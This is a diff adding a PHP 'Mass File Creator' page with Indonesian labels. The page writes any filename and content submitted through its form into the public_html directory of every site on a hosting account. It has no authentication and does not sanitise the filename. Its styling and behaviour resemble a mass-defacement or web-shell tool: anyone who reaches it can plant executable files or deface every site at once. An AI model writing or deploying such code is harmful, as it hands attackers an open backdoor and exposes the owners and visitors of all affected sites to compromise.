@@ -1,0 +1,52 @@
+<?php
+$base_dir = "/home/u987127072/domains";
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $filename = trim($_POST['filename']);
+    $file_content = $_POST['filecontent'];
+
+    if (empty($filename)) {
+        echo "<p style='color:red;'>Nama file tidak boleh kosong!</p>";
+    } else {
+        echo "<h3>Hasil Eksekusi:</h3>";
+
+        $sites = scandir($base_dir);
+        foreach ($sites as $site) {
+            if ($site === "." || $site === "..") continue;
+
+            $target_path = "$base_dir/$site/public_html";
+
+            if (is_dir($target_path)) {
+                $full_file_path = "$target_path/$filename";
+
+                if (file_put_contents($full_file_path, $file_content)) {
+                    echo "<p style='color:lime;'>[✔] Berhasil buat: $full_file_path</p>";
+                } else {
+                    echo "<p style='color:red;'>[✘] Gagal buat: $full_file_path</p>";
+                }
+            }
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mass File Creator</title>
+</head>
+<body style="background-color: black; color: white; font-family: Arial;">
+    <center>
+        <h2>Mass File Creator (by ChatGPT)</h2>
+        <form method="POST">
+            <label>Nama File:</label><br>
+            <input type="text" name="filename" style="width: 300px; background-color: #111; color: lime;" placeholder="robots.txt" required><br><br>
+
+            <label>Isi File:</label><br>
+            <textarea name="filecontent" rows="10" cols="50" style="background-color: #111; color: lime;" placeholder="User-agent: *&#10;Disallow: /"></textarea><br><br>
+
+            <input type="submit" value="Eksekusi" style="padding: 10px 20px; background-color: lime; border: none; font-weight: bold;">
+        </form>
+    </center>
+</body>
+</html>
